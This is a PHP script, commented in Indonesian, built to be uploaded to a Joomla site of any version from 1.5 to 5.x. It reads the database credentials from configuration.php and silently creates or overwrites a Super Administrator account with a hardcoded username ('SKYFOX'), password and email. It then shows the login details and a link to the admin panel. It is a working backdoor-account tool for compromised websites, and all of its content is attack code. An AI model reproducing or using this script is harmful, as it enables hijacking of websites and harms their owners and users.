<?php
// Script untuk membuat user administrator di semua versi Joomla
// Support: Joomla 1.5, 1.6, 1.7, 2.5, 3.x, 4.x, 5.x

// Matikan error reporting untuk keamanan
error_reporting(0);
ini_set('display_errors', 0);

// Konfigurasi user
$user = 'SKYFOX'; // Ganti dengan username yang diinginkan
$user_password = '@Cuanbanget04'; // Ganti dengan password yang diinginkan
$email = 'cukyiblis@gmail.com'; // Ganti dengan email yang diinginkan

// Cari file konfigurasi Joomla
$possible_configs = [
    $_SERVER['DOCUMENT_ROOT'] . '/configuration.php',
    $_SERVER['DOCUMENT_ROOT'] . '/../configuration.php',
    dirname($_SERVER['DOCUMENT_ROOT']) . '/configuration.php'
];

$config_path = null;
foreach ($possible_configs as $path) {
    if (file_exists($path)) {
        $config_path = $path;
        break;
    }
}

if (!$config_path) {
    die('❌ File configuration.php tidak ditemukan!');
}

// Baca dan ekstrak konfigurasi
$config_content = file_get_contents($config_path);

// Fungsi untuk ekstrak nilai dengan berbagai format
function extractConfigValue($content, $key) {
    // Support berbagai format:
    // public $var = 'value';
    // $var = 'value';
    // var $var = 'value';
    // define('VAR', 'value');
    
    $patterns = [
        "/public\s+\\\${$key}\s*=\s*['\"]([^'\"]+)['\"]/",
        "/\\\${$key}\s*=\s*['\"]([^'\"]+)['\"]/",
        "/var\s+\\\${$key}\s*=\s*['\"]([^'\"]+)['\"]/",
        "/define\s*\(\s*['\"]{$key}['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/",
    ];
    
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $content, $match)) {
            return $match[1];
        }
    }
    return null;
}

$localhost = extractConfigValue($config_content, 'host');
$username = extractConfigValue($config_content, 'user');
$password = extractConfigValue($config_content, 'password');
$database = extractConfigValue($config_content, 'db');
$prefix = extractConfigValue($config_content, 'dbprefix');

// Cek apakah semua data berhasil diekstrak
if (empty($localhost) || empty($username) || empty($password) || empty($database) || empty($prefix)) {
    die('❌ Gagal mengekstrak konfigurasi database!');
}

// Koneksi database
$conn = @mysqli_connect($localhost, $username, $password, $database);
if (!$conn) {
    die('❌ Koneksi database gagal!');
}
mysqli_set_charset($conn, 'utf8mb4');

// Deteksi versi Joomla dari tabel
function detectJoomlaVersion($conn, $prefix) {
    $tables = [
        'users' => ['id', 'username', 'email', 'password', 'block'],
        'user_usergroup_map' => ['user_id', 'group_id'],
        'usergroups' => ['id', 'title'],
        'user_profiles' => ['user_id', 'profile_key', 'profile_value']
    ];
    
    $version = 'unknown';
    
    // Cek struktur tabel users
    $checkUser = mysqli_query($conn, "SHOW COLUMNS FROM {$prefix}users");
    if ($checkUser) {
        $columns = [];
        while ($col = mysqli_fetch_assoc($checkUser)) {
            $columns[] = $col['Field'];
        }
        
        if (in_array('otpKey', $columns)) {
            $version = '4.x/5.x';
        } elseif (in_array('params', $columns) && in_array('block', $columns)) {
            $version = '2.5/3.x';
        } elseif (in_array('usertype', $columns)) {
            $version = '1.5/1.6/1.7';
        }
    }
    
    return $version;
}

$joomla_version = detectJoomlaVersion($conn, $prefix);

// Generate password hash berdasarkan versi Joomla
function generatePasswordHash($password, $version) {
    if (strpos($version, '4.x') !== false || strpos($version, '5.x') !== false) {
        // Joomla 4.x/5.x menggunakan bcrypt
        return password_hash($password, PASSWORD_BCRYPT);
    } elseif (strpos($version, '2.5') !== false || strpos($version, '3.x') !== false) {
        // Joomla 2.5/3.x menggunakan md5 dengan salt
        $salt = generateRandomString(32);
        return md5($password . $salt) . ':' . $salt;
    } else {
        // Joomla 1.5/1.6/1.7 menggunakan md5
        return md5($password);
    }
}

function generateRandomString($length = 32) {
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, $length);
}

$password_hash = generatePasswordHash($user_password, $joomla_version);

// Bersihkan input
$user_clean = mysqli_real_escape_string($conn, $user);
$username_clean = mysqli_real_escape_string($conn, str_replace(' ', '_', strtolower($user)));
$email_clean = mysqli_real_escape_string($conn, $email);
$password_hash_clean = mysqli_real_escape_string($conn, $password_hash);
$registerDate = date('Y-m-d H:i:s');

// Cek apakah user sudah ada
$checkUserSql = "SELECT id, password FROM {$prefix}users WHERE username = '$username_clean' OR email = '$email_clean'";
$checkResult = @mysqli_query($conn, $checkUserSql);

if ($checkResult && mysqli_num_rows($checkResult) > 0) {
    // Update user yang sudah ada
    $userData = mysqli_fetch_assoc($checkResult);
    $userId = $userData['id'];
    
    $updateSql = "UPDATE {$prefix}users SET 
        password = '$password_hash_clean',
        email = '$email_clean',
        name = '$user_clean'
        WHERE id = $userId";
    
    $updateResult = @mysqli_query($conn, $updateSql);
    
    if ($updateResult) {
        $status = "updated";
    } else {
        die('❌ Gagal update user!');
    }
} else {
    // Insert user baru berdasarkan versi Joomla
    if (strpos($joomla_version, '1.5') !== false || strpos($joomla_version, '1.6') !== false || strpos($joomla_version, '1.7') !== false) {
        // Joomla 1.5/1.6/1.7
        $sqlInsertUser = "INSERT INTO {$prefix}users (
            id, name, username, email, password, usertype, block, sendEmail, registerDate, lastvisitDate
        ) VALUES (
            NULL, '$user_clean', '$username_clean', '$email_clean', '$password_hash_clean', 
            'Super Administrator', 0, 0, '$registerDate', '0000-00-00 00:00:00'
        )";
    } else {
        // Joomla 2.5/3.x/4.x/5.x
        $sqlInsertUser = "INSERT INTO {$prefix}users (
            name, username, email, password, block, sendEmail, registerDate, lastvisitDate, activation, params
        ) VALUES (
            '$user_clean', '$username_clean', '$email_clean', '$password_hash_clean', 
            0, 0, '$registerDate', '0000-00-00 00:00:00', '', ''
        )";
    }
    
    $insertUserResult = @mysqli_query($conn, $sqlInsertUser);
    
    if (!$insertUserResult) {
        die('❌ Error saat insert user: ' . mysqli_error($conn));
    }
    
    $userId = mysqli_insert_id($conn);
    $status = "created";
}

// Assign user ke group Super Admin
function assignSuperAdminGroup($conn, $prefix, $userId, $joomla_version) {
    $assigned = false;
    
    // Cek tabel user_usergroup_map (Joomla 2.5+)
    $checkTable = "SHOW TABLES LIKE '{$prefix}user_usergroup_map'";
    $tableResult = @mysqli_query($conn, $checkTable);
    
    if (mysqli_num_rows($tableResult) > 0) {
        // Cek apakah sudah punya group
        $checkGroupSql = "SELECT * FROM {$prefix}user_usergroup_map WHERE user_id = $userId";
        $checkGroupResult = @mysqli_query($conn, $checkGroupSql);
        
        if ($checkGroupResult && mysqli_num_rows($checkGroupResult) == 0) {
            // Cari Super Admin group ID
            $groupCheck = "SELECT id FROM {$prefix}usergroups 
                          WHERE title LIKE '%Super%' OR title = 'Super Users' 
                          ORDER BY id LIMIT 1";
            $groupResult = @mysqli_query($conn, $groupCheck);
            
            if ($groupResult && mysqli_num_rows($groupResult) > 0) {
                $row = mysqli_fetch_assoc($groupResult);
                $group_id = $row['id'];
            } else {
                // Default group ID untuk berbagai versi Joomla
                if (strpos($joomla_version, '2.5') !== false) {
                    $group_id = 25; // Joomla 2.5 Super Admin
                } else {
                    $group_id = 8; // Joomla 3.x/4.x/5.x Super Admin
                }
            }
            
            $sqlInsertGroup = "INSERT INTO {$prefix}user_usergroup_map (user_id, group_id) VALUES ($userId, $group_id)";
            @mysqli_query($conn, $sqlInsertGroup);
            $assigned = true;
        } else {
            $assigned = true;
        }
    }
    
    // Cek tabel usermap (Joomla 1.5/1.6/1.7)
    if (!$assigned) {
        $checkTable2 = "SHOW TABLES LIKE '{$prefix}usermap'";
        $tableResult2 = @mysqli_query($conn, $checkTable2);
        
        if (mysqli_num_rows($tableResult2) > 0) {
            $sqlInsertMap = "INSERT INTO {$prefix}usermap (user_id, group_id) VALUES ($userId, 25)";
            @mysqli_query($conn, $sqlInsertMap);
            $assigned = true;
        }
    }
    
    return $assigned;
}

assignSuperAdminGroup($conn, $prefix, $userId, $joomla_version);

// Tambahkan profile untuk Joomla 3.2+
$checkProfile = "SHOW TABLES LIKE '{$prefix}user_profiles'";
$profileResult = @mysqli_query($conn, $checkProfile);

if (mysqli_num_rows($profileResult) > 0) {
    $checkProfileData = "SELECT * FROM {$prefix}user_profiles WHERE user_id = $userId";
    $checkProfileDataResult = @mysqli_query($conn, $checkProfileData);
    
    if ($checkProfileDataResult && mysqli_num_rows($checkProfileDataResult) == 0) {
        $profileQueries = [
            "INSERT INTO {$prefix}user_profiles (user_id, profile_key, profile_value, ordering) VALUES ($userId, 'profile.language', 'en-GB', 1)",
            "INSERT INTO {$prefix}user_profiles (user_id, profile_key, profile_value, ordering) VALUES ($userId, 'profile.editor', 'tinymce', 2)"
        ];
        
        foreach ($profileQueries as $query) {
            @mysqli_query($conn, $query);
        }
    }
}

// Tutup koneksi
mysqli_close($conn);

// Tampilkan hasil
echo "<html><head><title>User Created</title>";
echo "<style>
    body { font-family: Arial, sans-serif; background: #f0f0f0; padding: 20px; }
    .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
    .success { color: #27ae60; font-weight: bold; }
    .info { background: #e8f4f8; padding: 15px; border-radius: 5px; margin: 10px 0; }
    .warning { background: #fff3cd; padding: 15px; border-radius: 5px; margin: 10px 0; border-left: 4px solid #ffc107; }
    .btn { display: inline-block; padding: 10px 20px; background: #3498db; color: #fff; text-decoration: none; border-radius: 5px; }
    .btn:hover { background: #2980b9; }
</style></head><body>";
echo "<div class='container'>";
echo "<h2>✅ User " . ($status == 'updated' ? 'diupdate' : 'dibuat') . "!</h2>";
echo "<div class='info'>";
echo "<p><strong>Username:</strong> $user</p>";
echo "<p><strong>Password:</strong> $user_password</p>";
echo "<p><strong>Email:</strong> $email</p>";
echo "<p><strong>User ID:</strong> $userId</p>";
echo "<p><strong>Joomla Version:</strong> " . htmlspecialchars($joomla_version) . "</p>";
echo "</div>";
echo "<div class='warning'>";
echo "<p><strong>Informasi Login:</strong></p>";
echo "<p><a href='" . rtrim($_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'], '/') . "/administrator' target='_blank'>Login ke Administrator</a></p>";
echo "<p>Username: <strong>$user</strong></p>";
echo "<p>Password: <strong>$user_password</strong></p>";
echo "</div>";
echo "<p style='color:#888;font-size:12px;'>Simpan informasi ini dengan aman!</p>";
echo "</div></body></html>";
?>
